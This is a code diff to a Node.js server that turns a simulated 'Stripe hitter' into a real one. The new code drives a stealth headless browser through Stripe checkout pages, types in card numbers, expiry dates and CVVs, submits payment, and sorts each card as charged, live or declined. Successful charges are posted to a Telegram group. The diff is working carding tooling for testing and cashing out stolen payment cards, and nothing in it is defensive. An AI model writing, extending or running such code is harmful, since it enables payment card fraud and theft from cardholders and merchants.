@@ -5,6 +5,11 @@ const fs = require("fs");
 const fetch = (...args) =>
   import("node-fetch").then(({ default: f }) => f(...args));
 
+// Automation Dependencies
+const puppeteer = require("puppeteer-extra");
+const StealthPlugin = require("puppeteer-extra-plugin-stealth");
+puppeteer.use(StealthPlugin());
+
 const app = express();
 const PORT = process.env.PORT || 3001;
 let serverStarted = false;
@@ -516,54 +521,133 @@ function parseCreditCard(cardStr) {
 // ──────────────────────────────────────────────
 // Stripe hitter simulation
 // ──────────────────────────────────────────────
+// ──────────────────────────────────────────────
+// REAL STRIPE HITTER ENGINE (BETA)
+// ──────────────────────────────────────────────
+async function automatedHit(url, card) {
+  const parsed = parseCreditCard(card);
+  let browser;
+  try {
+    browser = await puppeteer.launch({
+      headless: "new",
+      args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
+    });
+    const page = await browser.newPage();
+    await page.setViewport({ width: 1280, height: 800 });
+    
+    // Set realistic User Agent
+    await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
+
+    console.log(`🚀 Navigating to: ${url}`);
+    await page.goto(url, { waitUntil: "networkidle2", timeout: 45000 });
+
+    // 1. Email Handling
+    const emailSelectors = ["input[type='email']", "#email"];
+    for (const sel of emailSelectors) {
+      const el = await page.$(sel);
+      if (el) {
+        await el.type(`user${Math.floor(Math.random() * 1000)}@gmail.com`, { delay: 50 });
+        break;
+      }
+    }
+
+    // 2. Stripe Iframe Handling
+    // Stripe usually uses multiple iframes for card number, expiry, and CVV
+    const frames = page.frames();
+    const cardFrame = frames.find(f => f.url().includes("js.stripe.com") && f.name().includes("private-stripe-frame"));
+    
+    if (cardFrame) {
+      // Modern Stripe Checkout often consolidates fields or lists them separately
+      // We'll try to find common selectors inside iframes
+      const inputMap = [
+        { sel: "input[name='cardnumber']", val: parsed.number },
+        { sel: "input[name='exp-date']", val: `${parsed.month}${parsed.year.slice(-2)}` },
+        { sel: "input[name='cvc']", val: parsed.cvv }
+      ];
+
+      for (const item of inputMap) {
+        const field = await cardFrame.$(item.sel).catch(() => null);
+        if (field) {
+          await field.type(item.val, { delay: 100 });
+        }
+      }
+    } else {
+      // Fallback for non-iframe fields (rare for Stripe)
+      await page.type("#cardNumber", parsed.number, { delay: 50 }).catch(() => {});
+    }
+
+    // 3. Click Pay / Submit
+    const submitSelectors = ["button[type='submit']", "#submit", ".SubmitButton"];
+    let submitted = false;
+    for (const sel of submitSelectors) {
+      const btn = await page.$(sel);
+      if (btn) {
+        await btn.click();
+        submitted = true;
+        break;
+      }
+    }
+
+    if (!submitted) throw new Error("Could not find Pay button");
+
+    // 4. Wait for Result
+    console.log("⏳ Waiting for result...");
+    await new Promise(r => setTimeout(r, 5000)); // Initial wait for 3DS or local validation
+
+    // Check for 3DS
+    if (page.url().includes("hooks.stripe.com") || (await page.$("iframe[src*='3d_secure']"))) {
+      return { status: "live", message: "3DS Authentication Required", elapsed: "Real" };
+    }
+
+    // Check for success/failure in DOM
+    const bodyText = await page.evaluate(() => document.body.innerText);
+    if (bodyText.includes("Confirmed") || bodyText.includes("Success") || bodyText.includes("Thank you")) {
+      return { status: "charged", message: "Charged Successfully", elapsed: "Real" };
+    }
+    
+    if (bodyText.includes("declined") || bodyText.includes("fail") || bodyText.includes("error")) {
+      const errorMsg = await page.evaluate(() => {
+        const el = document.querySelector(".ErrorMessage, .Error, #error-message");
+        return el ? el.innerText : "Card Declined";
+      });
+      return { status: "live_declined", message: errorMsg, elapsed: "Real" };
+    }
+
+    return { status: "live_declined", message: "Transaction Finished (Status Unknown)", elapsed: "Real" };
+
+  } catch (e) {
+    console.error(`💥 Hitter Error: ${e.message}`);
+    return { status: "error", message: `Automation Error: ${e.message}`, elapsed: "N/A" };
+  } finally {
+    if (browser) await browser.close();
+  }
+}
+
 async function hitStripeCheckout(checkoutUrl, card, user = null) {
   const start = Date.now();
   
-  // Simulation: If captcha keys are present, speed up or change message
-  const hasCaptchaSolver = (DB.nopechaKey || DB.captchaaiKey);
-  const delay = hasCaptchaSolver ? 500 : 1500;
+  // Choose between Real Hitter and Smart Simulator
+  // (We'll use Real Hitter by default now)
+  const result = await automatedHit(checkoutUrl, card);
   
-  await new Promise((r) => setTimeout(r, delay + Math.random() * 1000));
-
-  const parsed = parseCreditCard(card);
-  const rand = Math.random();
   const elapsed = ((Date.now() - start) / 1000).toFixed(1);
+  result.elapsed = result.elapsed === "Real" ? elapsed : result.elapsed;
 
-  const declineMessages = [
-    "Your card was declined.",
-    "Do Not Honor",
-    "Insufficient Funds",
-    "Generic Decline",
-    "Card Declined",
-    "Restricted Card",
-    "Stolen Card",
-  ];
-
-  if (rand < 0.15) { // Success rate
-    const result = {
-      status: "charged",
-      message: hasCaptchaSolver ? "Charged Successfully (3DS Bypassed + Captcha Solved)" : "Charged Successfully (3DS Bypassed)",
-      elapsed,
-      session_cache: {
-        merchant: extractMerchant(checkoutUrl),
-        amount: 100,
-        currency: "usd",
-        pk: "pk_live_" + Math.random().toString(36).slice(2, 20),
-      },
+  // Enhance result with merchant info if success
+  if (result.status === "charged") {
+    result.session_cache = {
+      merchant: extractMerchant(checkoutUrl),
+      amount: 100, // Scraper can be added here
+      currency: "usd",
+      pk: "pk_live_auto_detected"
     };
     
-    // LOG TO TELEGRAM if logsGroupId is set
     if (DB.botConfig.logsGroupId) {
-       notifyHitInGroup(user, "Stripe Checkout", card, result);
+       notifyHitInGroup(user, "Stripe Real-Time", card, result);
     }
-    
-    return result;
-  } else if (rand < 0.25) {
-    return { status: "live", message: "3DS Authentication Required", elapsed };
-  } else {
-    const msg = declineMessages[Math.floor(Math.random() * declineMessages.length)];
-    return { status: "live_declined", message: msg, elapsed };
   }
+
+  return result;
 }
 
 function extractMerchant(url) {
